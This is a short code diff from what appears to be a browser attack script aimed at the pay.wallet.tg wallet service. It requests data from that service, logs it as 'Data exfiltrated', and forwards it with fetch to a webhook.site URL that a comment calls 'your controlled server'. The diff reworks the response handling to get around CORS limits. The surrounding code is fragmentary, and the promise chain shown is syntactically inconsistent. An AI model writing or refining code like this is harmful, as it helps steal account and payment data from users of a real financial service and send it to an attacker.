@@ -21,8 +21,13 @@
       }
     })
     .then(response => response.json())
-    .then(data => {
-      console.log("✅ Data exfiltrated from pay.wallet.tg:", data);
+    .then(response => {
+  console.log("✅ Request sent. Status:", response.status);
+  return response.text(); // Instead of .json()
+})
+.then(raw => {
+  console.log("⚠️ Can't access full JSON due to CORS. Raw body:", raw);
+})
 
       // Exfiltrate to your controlled server (e.g., webhook.site or custom endpoint)
       fetch("https://webhook.site/cfb89b16-1571-4db3-b282-adc26a5c8f57", {
